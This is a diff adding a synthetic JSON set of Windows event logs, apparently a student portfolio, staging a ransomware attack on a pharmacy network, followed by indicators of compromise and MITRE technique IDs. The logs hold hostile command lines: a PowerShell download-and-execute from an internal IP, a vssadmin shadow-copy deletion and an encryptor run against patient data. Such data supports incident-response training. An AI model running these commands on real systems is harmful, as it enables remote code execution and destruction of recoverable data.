@@ -1,0 +1,584 @@
+{
+  "metadata": {
+    "source": "generate_sample_logs.py",
+    "generated_at": "2026-06-01T01:55:40.013280",
+    "watermark": "SYNTHETIC-PORTFOLIO-DATA-2026",
+    "disclaimer": "ALL DATA IS FABRICATED. No real PHI, names, or credentials.",
+    "author": "Vincent Phan (CPhT, CSUSB-bound IT/Cybersecurity student)",
+    "scenario": "Pharmacy ransomware attack: phishing -> lateral movement -> encryption -> IoT disconnect",
+    "system": "PHARM-DC-01 (Domain Controller), PHARM-WS-03 (Pharmacy workstation), PHARM-WS-DISP (Dispensary)",
+    "vlan_mapping": {
+      "VLAN_10": "Corporate / Pharmacy workstations",
+      "VLAN_20": "Servers / Domain Controller",
+      "VLAN_30": "IoT / Temperature sensors",
+      "VLAN_99": "Evidence preservation (isolated)"
+    }
+  },
+  "events": [
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-05-15T18:00:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "40d2b5d95abfc133f33d7ddfea282513",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Successful logon: PHARM-TECH\\jchen from workstation PHARM-WS-03. Logon type 2 (Interactive).",
+      "Data": {
+        "LogonType": "2",
+        "IpAddress": "10.0.1.45",
+        "TargetUserName": "jchen",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1040,
+      "TimeCreated": "2026-05-15T18:07:00.000000Z",
+      "Channel": "Application",
+      "Level": "4",
+      "Provider": "MsiInstaller",
+      "EventRecordID": "99664b7850c1df5fb5da9eafc8fd64fb",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Installer began: Adobe Reader update (legitimate).",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1,
+      "TimeCreated": "2026-05-15T18:12:00.000000Z",
+      "Channel": "Windows PowerShell",
+      "Level": "4",
+      "Provider": "PowerShell",
+      "EventRecordID": "9bcc6942e91870fe689f00c914c03990",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Engine state changed from None to Available. Session started by user PHARM-TECH\\jchen.",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 400,
+      "TimeCreated": "2026-05-15T18:12:00.000000Z",
+      "Channel": "Windows PowerShell",
+      "Level": "4",
+      "Provider": "PowerShell",
+      "EventRecordID": "75fad828f1b2a55e30561ec4da284436",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Remote host is started. Host application path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4103,
+      "TimeCreated": "2026-05-15T18:13:00.000000Z",
+      "Channel": "Windows PowerShell",
+      "Level": "3",
+      "Provider": "PowerShell",
+      "EventRecordID": "dbb6e67f2131962386ea067d8b44159d",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Command invoked: 'Invoke-Expression -Command (New-Object Net.WebClient).DownloadString(\"http://192.168.200.55/payload.ps1\")'",
+      "Data": {
+        "CommandLine": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://192.168.200.55/payload.ps1')",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-05-15T18:15:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "88bac334542bc940adaf53b5a1748e32",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Successful logon: PHARM-TECH\\jchen from workstation PHARM-WS-03. Logon type 3 (Network).",
+      "Data": {
+        "LogonType": "3",
+        "IpAddress": "10.0.1.45",
+        "TargetUserName": "jchen",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-05-15T18:22:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "8e6827e064bf2d655031c32778530886",
+      "Computer": "PHARM-DC-01",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Successful logon: PHARM-TECH\\svc_backup from PHARM-DC-01. Logon type 3 (Network).",
+      "Data": {
+        "LogonType": "3",
+        "IpAddress": "10.0.1.10",
+        "TargetUserName": "svc_backup",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-05-15T18:25:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "2accac0583699c585a6f212b4595a382",
+      "Computer": "PHARM-DC-01",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Successful logon: PHARM-TECH\\admin from PHARM-DC-01. Logon type 3 (Network).",
+      "Data": {
+        "LogonType": "3",
+        "IpAddress": "10.0.1.10",
+        "TargetUserName": "admin",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4648,
+      "TimeCreated": "2026-05-15T18:27:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "51f9a8a6ffebb6257ede0a2b88588d81",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Attempted logon using explicit credentials: PHARM-TECH\\admin targeting PHARM-WS-DISP.",
+      "Data": {
+        "TargetServerName": "PHARM-WS-DISP",
+        "IpAddress": "10.0.1.10",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1,
+      "TimeCreated": "2026-05-15T18:32:00.000000Z",
+      "Channel": "System",
+      "Level": "4",
+      "Provider": "Service Control Manager",
+      "EventRecordID": "7b4cf337ba7596a9211049f8bbb27539",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Service start: WinDefend (Windows Defender Antivirus Service).",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 5001,
+      "TimeCreated": "2026-05-15T18:35:00.000000Z",
+      "Channel": "Microsoft-Windows-Windows Defender/Operational",
+      "Level": "3",
+      "Provider": "Microsoft-Windows-Windows Defender",
+      "EventRecordID": "d3bd4b22f404a9c267dd20ed6c441682",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Antimalware protection disabled on PHARM-WS-DISP. Reason: User action.",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 5001,
+      "TimeCreated": "2026-05-15T18:38:00.000000Z",
+      "Channel": "Microsoft-Windows-Windows Defender/Operational",
+      "Level": "3",
+      "Provider": "Microsoft-Windows-Windows Defender",
+      "EventRecordID": "180e06ec1f12c90aca80289c3af296d0",
+      "Computer": "PHARM-DC-01",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Antimalware protection disabled on PHARM-DC-01. Reason: User action.",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1,
+      "TimeCreated": "2026-05-15T18:42:00.000000Z",
+      "Channel": "System",
+      "Level": "4",
+      "Provider": "Service Control Manager",
+      "EventRecordID": "75c92522ecd20b26f68cb0fc43b3d9cc",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Service start: vss (Volume Shadow Copy).",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1,
+      "TimeCreated": "2026-05-15T18:47:00.000000Z",
+      "Channel": "System",
+      "Level": "4",
+      "Provider": "Service Control Manager",
+      "EventRecordID": "cddd86e90a197227e757900a7d185f53",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Service stop: vss (Volume Shadow Copy).",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-05-15T18:48:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "ece65e4ac535fb29aa4cae1bfb83b804",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Process created: New process C:\\Windows\\System32\\vssadmin.exe with command line 'vssadmin delete shadows /all /quiet'.",
+      "Data": {
+        "CommandLine": "vssadmin delete shadows /all /quiet",
+        "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-05-15T18:52:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "c8a00b1e1a27cf6530ff9108b7cc0053",
+      "Computer": "PHARM-DC-01",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Process created: New process C:\\Windows\\Temp\\encryptor.exe with command line 'encryptor.exe -target \\\\\\\\PHARM-DC\\Shared\\PatientData -ext .encrypted'.",
+      "Data": {
+        "CommandLine": "encryptor.exe -target \\\\\\\\PHARM-DC\\Shared\\PatientData -ext .encrypted",
+        "NewProcessName": "C:\\Windows\\Temp\\encryptor.exe",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4663,
+      "TimeCreated": "2026-05-15T18:55:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "b5e594cee9603ef1522ffc380135e071",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Object access: File C:\\Shared\\PatientData\\Patient_001_demographics.txt was modified. User: PHARM-TECH\\admin.",
+      "Data": {
+        "ObjectName": "C:\\Shared\\PatientData\\Patient_001_demographics.txt",
+        "AccessMask": "0x10000",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4663,
+      "TimeCreated": "2026-05-15T18:57:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "9c6e222b062ee4ddb070b2d8c7755652",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Object access: File C:\\Shared\\PatientData\\Patient_002_prescription.json was modified. User: PHARM-TECH\\admin.",
+      "Data": {
+        "ObjectName": "C:\\Shared\\PatientData\\Patient_002_prescription.json",
+        "AccessMask": "0x10000",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4663,
+      "TimeCreated": "2026-05-15T19:00:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "f719c26a8ce53d8124df5d82a65c5f17",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Object access: File C:\\Shared\\PatientData\\Patient_003_insurance.xml was modified. User: PHARM-TECH\\admin.",
+      "Data": {
+        "ObjectName": "C:\\Shared\\PatientData\\Patient_003_insurance.xml",
+        "AccessMask": "0x10000",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4663,
+      "TimeCreated": "2026-05-15T19:05:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "e7b90722b075e4dfa00c0e74a13d5af7",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Object access: File C:\\Shared\\PatientData\\Patient_004_billing.csv was modified. User: PHARM-TECH\\admin.",
+      "Data": {
+        "ObjectName": "C:\\Shared\\PatientData\\Patient_004_billing.csv",
+        "AccessMask": "0x10000",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4663,
+      "TimeCreated": "2026-05-15T19:12:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "8bb46e2a155c7dedb2020827a30d57d8",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Object access: File C:\\Shared\\PatientData\\Patient_005_medication_history.docx was modified. User: PHARM-TECH\\admin.",
+      "Data": {
+        "ObjectName": "C:\\Shared\\PatientData\\Patient_005_medication_history.docx",
+        "AccessMask": "0x10000",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1,
+      "TimeCreated": "2026-05-15T19:15:00.000000Z",
+      "Channel": "System",
+      "Level": "4",
+      "Provider": "Service Control Manager",
+      "EventRecordID": "dad995949c19af773fb2ad7eb2572df3",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Service stop: IoT_TempSensor (Temperature monitoring service on VLAN 30).",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1,
+      "TimeCreated": "2026-05-15T19:16:00.000000Z",
+      "Channel": "System",
+      "Level": "4",
+      "Provider": "Service Control Manager",
+      "EventRecordID": "5d5fa4f522b20cbf4555317540c879ec",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Service stop: IoT_HumiditySensor (Humidity monitoring service on VLAN 30).",
+      "Data": {
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 1014,
+      "TimeCreated": "2026-05-15T19:18:00.000000Z",
+      "Channel": "System",
+      "Level": "3",
+      "Provider": "Microsoft-Windows-DNS-Client",
+      "EventRecordID": "f795cf0127260b601020a4b151c668e2",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] DNS resolution failed: Name resolution for the name temp-sensor-01.pharm.local timed out after none of the configured DNS servers responded.",
+      "Data": {
+        "QueryName": "temp-sensor-01.pharm.local",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-05-15T19:22:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "082cd7af3e030b8f25568f7df135d05d",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Failed logon: Unknown user from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
+      "Data": {
+        "LogonType": "10",
+        "IpAddress": "203.0.113.77",
+        "TargetUserName": "UNKNOWN",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-05-15T19:25:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "f3416f7f51aad0d5c2f52666a53158bc",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Failed logon: Unknown user from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
+      "Data": {
+        "LogonType": "10",
+        "IpAddress": "203.0.113.77",
+        "TargetUserName": "UNKNOWN",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-05-15T19:30:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "8b0bb14aacf60a3ec256b0800141376e",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Failed logon: PHARM-TECH\\admin from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
+      "Data": {
+        "LogonType": "10",
+        "IpAddress": "203.0.113.77",
+        "TargetUserName": "admin",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-05-15T19:35:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "761a42604766537c71eeda0390f93856",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Successful logon: PHARM-TECH\\admin from IP 203.0.113.77 (external). Logon type 10 (RemoteInteractive).",
+      "Data": {
+        "LogonType": "10",
+        "IpAddress": "203.0.113.77",
+        "TargetUserName": "admin",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-05-15T19:40:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "9e21895776b4290ddd9a8069cb21e87f",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Process created: New process C:\\Windows\\System32\\cmd.exe with command line 'cmd.exe /c echo YOUR FILES HAVE BEEN ENCRYPTED > C:\\Shared\\README_RECOVER.txt'.",
+      "Data": {
+        "CommandLine": "cmd.exe /c echo YOUR FILES HAVE BEEN ENCRYPTED > C:\\Shared\\README_RECOVER.txt",
+        "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4663,
+      "TimeCreated": "2026-05-15T19:45:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "56b2de356d5189e592a8ece721469839",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Object access: File C:\\Shared\\PatientData\\README_RECOVER.txt was created. User: PHARM-TECH\\admin.",
+      "Data": {
+        "ObjectName": "C:\\Shared\\PatientData\\README_RECOVER.txt",
+        "AccessMask": "0x10000",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    },
+    {
+      "EventID": 4656,
+      "TimeCreated": "2026-05-15T19:50:00.000000Z",
+      "Channel": "Security",
+      "Level": "4",
+      "Provider": "Microsoft-Windows-Security-Auditing",
+      "EventRecordID": "220fd9dbbb0f9d6022fc997f15cf2ba7",
+      "Computer": "PHARM-WS-03",
+      "SecurityUserID": "S-1-5-21-SYNTHETIC-0000000000-0000000000-0000000000-500",
+      "Message": "[SYNTHETIC] Object access: Handle to C:\\Shared\\PatientData\\inventory_20260515.xlsx requested. User: PHARM-TECH\\admin.",
+      "Data": {
+        "ObjectName": "C:\\Shared\\PatientData\\inventory_20260515.xlsx",
+        "AccessMask": "0x10000",
+        "_Synthetic": "true",
+        "_Watermark": "PORTFOLIO-SAMPLE-2026"
+      }
+    }
+  ],
+  "iocs": {
+    "file_hashes": {
+      "encryptor.exe": "88e80df89cd71b7f6ca924d669977b292d906b229308730c727f4f1e04ee8dda",
+      "payload.ps1": "29c59adddeea115bfe13599cc7322b44886ab27b69f4f14eb40b91894d4bbce5"
+    },
+    "ip_addresses": [
+      "203.0.113.77",
+      "192.168.200.55"
+    ],
+    "domains": [
+      "temp-sensor-01.pharm.local"
+    ],
+    "file_extensions": [
+      ".encrypted",
+      ".locked",
+      ".README_RECOVER.txt"
+    ],
+    "mitre_techniques": [
+      {
+        "id": "T1566.001",
+        "name": "Phishing: Spearphishing Attachment"
+      },
+      {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell"
+      },
+      {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      },
+      {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      },
+      {
+        "id": "T1021.001",
+        "name": "Remote Services: RDP"
+      },
+      {
+        "id": "T1490",
+        "name": "Inhibit System Recovery"
+      },
+      {
+        "id": "T1486",
+        "name": "Data Encrypted for Impact"
+      },
+      {
+        "id": "T1496",
+        "name": "Resource Hijacking"
+      }
+    ]
+  }
+}
